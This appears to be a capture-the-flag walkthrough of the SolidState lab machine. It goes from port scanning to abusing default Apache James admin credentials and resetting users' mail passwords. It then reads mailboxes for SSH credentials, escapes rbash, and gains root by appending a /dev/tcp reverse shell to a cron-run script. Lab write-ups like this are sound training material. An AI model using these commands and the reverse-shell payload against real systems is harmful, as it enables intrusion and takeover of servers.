## Intro


Tags: #linux #WebApp #telnet #DefaultCreds #MailServer #codereview #unknown-binary #medium 

---
# Reconnaissance

## Port scan

### TCP open ports

A full TCP port scan reveals several open services, with Apache James standing out as the primary attack surface.

```bash
nmap -p- --open -n -Pn -sS -vvv --min-rate 5000 10.10.10.51 -oG allPorts
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

### TCP targeted scan on open ports

A targeted version scan identifies Apache James 2.3.2 running across multiple ports.

```bash
nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
```

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp    JAMES smtpd 2.3.2
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|_    Login failed for
```

## Web App

### Directories

Directory brute-forcing on port 80 reveals no useful hidden paths.

```bash
feroxbuster -u http://10.10.10.51 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
No interesting directories discovered.

---
# Foothold

## Telnet login via default creds

Port 4555 hosts the James Remote Administration Tool with default credentials `root:root`.

```bash
telnet 10.10.10.51 4555
```

```text
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id: root
Password: root
Welcome root. HELP for a list of commands
```

### Enumerating mail server users

Listing users reveals five accounts on the mail server
```bash
listusers
```

```shell
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

### Resetting mailbox passwords

Reset passwords for all users to gain access to their mailboxes.
```bash
setpassword mindy mindy
setpassword john john
setpassword thomas thomas
setpassword james james
setpassword mailadmin mailadmin
```

## Accessing POP3 Mailbox

Connect to the `POP3` service on port `110` and retrieve Mindy's emails.
```bash
telnet 10.10.10.51 110
```

```bash
USER mindy
PASS mindy
LIST
RETR 1
RETR 2
```
#### creds obtained
```text
Username: mindy
Password: P@55W0rd1!2@
```

## Shell as Mindy

Log in as Mindy using the discovered credentials.
```bash
ssh mindy@solidstate.htb
```

```shell
mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```
grabbed user flag!

---

# Privilege Escalation

## Escaping Restricted Shell (rbash)

Mindy's account uses `rbash` (restricted bash). Escape it by forcing a bash shell on SSH login.

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

### Stabilizing the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### sudo -l

failed

### Checking writable files owned by root

Check for writable files owned by root.
```bash
ls -la /opt/
```
#### Non systemic script found
```text
-rwxrwxrwx 1 root root 105 Mar 14 12:15 tmp.py
```

```test
-  rwx  rwx  rwx
│   │    │    │
│   │    │    └── Others (everyone else)
│   │    └─────── Group (the file's group members)
│   └──────────── Owner/User (the file's owner)
└──────────────── File type
```
so this means its `world-writable`

### Analyzing the suspicious Script

View the contents of the world-writable Python script.
```bash
cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys

try:
    os.system("rm -r /tmp/* ")
except:
    sys.exit()
```

## Confirming Cron Execution

Verify the script runs periodically by creating a test file.
```bash
touch /tmp/test
sleep 60
ls /tmp/
```
-> The test file was removed, confirming cron execution.

## Exploiting the Cron Job

Append a reverse shell payload to the world-writable script.
```bash
echo 'os.system("bash -c \'bash -i >& /dev/tcp/10.10.14.247/4444 0>&1\'")' >> /opt/tmp.py
```
start listener
```bash
nc -lvnp 4444
```

## Shell as root

got shell back on my listener!
```shell
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.51] 54321
root@solidstate:~# id
uid=0(root) gid=0(root) groups=0(root)
```
grabbed root flag

---


